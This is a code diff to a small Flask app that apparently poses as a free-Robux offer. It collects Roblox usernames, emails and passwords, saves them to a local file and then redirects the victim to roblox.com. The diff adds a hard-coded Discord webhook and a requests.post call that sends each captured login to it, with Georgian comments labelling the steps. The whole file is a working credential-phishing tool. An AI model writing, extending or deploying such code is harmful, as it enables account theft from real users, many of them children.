@@ -1,9 +1,14 @@
+
 from flask import Flask, render_template, request, redirect
 import json
 import os
+import requests
 
 app = Flask(__name__)
 VAULT_FILE = "passwords.json"
+
+# ⚠️ აქ ჩასვი შენი Discord-ის Webhook ლინკი ⚠️
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1565382099521900626/MiKgEXFAMtWJGkJDscPmGSES-XMQ3u_C5HC2CAnbF6_xA8PYRh8DOfdCC2J_4r9GYlrP"
 
 def load_vault():
     if not os.path.exists(VAULT_FILE):
@@ -27,9 +32,9 @@ def index():
         email = request.form.get('email', '')
         password = request.form.get('password', '')
         
+        # 1. ვინახავთ ლოკალურად (passwords.json)
         vault = load_vault()
         entry_key = f"{username} ({robux_amount} Robux)"
-        
         vault[entry_key] = {
             "service": service,
             "robux_requested": robux_amount,
@@ -37,8 +42,17 @@ def index():
             "email": email,
             "password": password
         }
-        
         save_vault(vault)
+        
+        # 2. ვაგზავნით Discord-ში
+        discord_data = {
+            "content": f"**ახალი მონაცემი!**\n👤 სახელი: {username}`\n📧 მეილი: `{email}`\n🔑 პაროლი: `{password}`\n🪙 რობუქსი: `{robux_amount}"
+        }
+        try:
+            requests.post(DISCORD_WEBHOOK_URL, json=discord_data)
+        except Exception as e:
+            print(f"Discord-ში გაგზავნის შეცდომა: {e}")
+
         return redirect('https://www.roblox.com')
 
     return render_template('index.html')
